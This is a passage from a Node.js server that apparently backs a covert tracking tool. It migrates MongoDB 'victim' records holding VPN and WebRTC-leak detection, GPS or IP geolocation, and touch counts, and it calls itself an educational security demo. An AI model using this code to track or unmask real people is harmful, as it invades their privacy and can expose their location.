            vpnDetection.likelyVPN = true;
            vpnDetection.confidence = vpnDetection.webRTCLeak ? 'high' : 'medium';
          } else if (vpnDetection.suspiciousISP) {
            vpnDetection.likelyVPN = true;
            vpnDetection.confidence = 'low';
          }

          updates['network.vpnDetection'] = vpnDetection;
          needsUpdate = true;
        }

        // 4. Agregar behavior.touches y swipes si no existen
        if (victim.behavior && !victim.behavior.touches) {
          updates['behavior.touches'] = 0;
          updates['behavior.swipes'] = 0;
          needsUpdate = true;
        }

        // 5. Agregar locationSource si no existe
        if (victim.network && !victim.network.locationSource) {
          if (victim.geolocation?.latitude && victim.geolocation?.longitude) {
            updates['network.locationSource'] = 'gps';
          } else {
            updates['network.locationSource'] = 'ipapi';
          }
          needsUpdate = true;
        }

        // Aplicar actualizaciones si hay cambios
        if (needsUpdate) {
          await victimsCollection.updateOne(
            { _id: victim._id },
            { $set: updates }
          );
          updated++;
        }

      } catch (error) {
        console.error(`Error migrando victim ${victim._id}:`, error);
        errors++;
      }
    }

    console.log(`✅ Migración completada: ${updated} registros actualizados, ${errors} errores`);

    res.json({
      success: true,
      message: 'Migration completed',
      totalRecords: allVictims.length,
      updated: updated,
      errors: errors,
      unchanged: allVictims.length - updated - errors
    });

  } catch (error) {
    console.error('Error en /api/migrate:', error);
    res.status(500).json({
      success: false,
      error: 'Migration failed',
      details: error.message
    });
  }
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Unhandled error:', err);
  res.status(500).json({ 
    success: false, 
    error: 'Internal server error',
    details: err.message 
  });
});

// Manejo de cierre graceful
process.on('SIGINT', async () => {
  console.log('\n🛑 Cerrando servidor...');
  try {
    await client.close();
    console.log('✅ Conexión a MongoDB cerrada');
    process.exit(0);
  } catch (error) {
    console.error('❌ Error cerrando MongoDB:', error);
    process.exit(1);
  }
});

process.on('SIGTERM', async () => {
  console.log('\n🛑 SIGTERM recibido, cerrando servidor...');
  try {
    await client.close();
    console.log('✅ Conexión a MongoDB cerrada');
    process.exit(0);
  } catch (error) {
    console.error('❌ Error cerrando MongoDB:', error);
    process.exit(1);
  }
});

// Iniciar servidor
async function startServer() {
  await connectDB();
  app.listen(PORT, () => {
    console.log(`🚀 Servidor corriendo en puerto ${PORT}`);
    console.log(`🌐 Entorno: ${process.env.NODE_ENV || 'development'}`);
    console.log(`⚠️  PROPÓSITO: Demostración educativa de seguridad`);
  });
}

startServer().catch(error => {
  console.error('❌ Error iniciando servidor:', error);
  process.exit(1);
});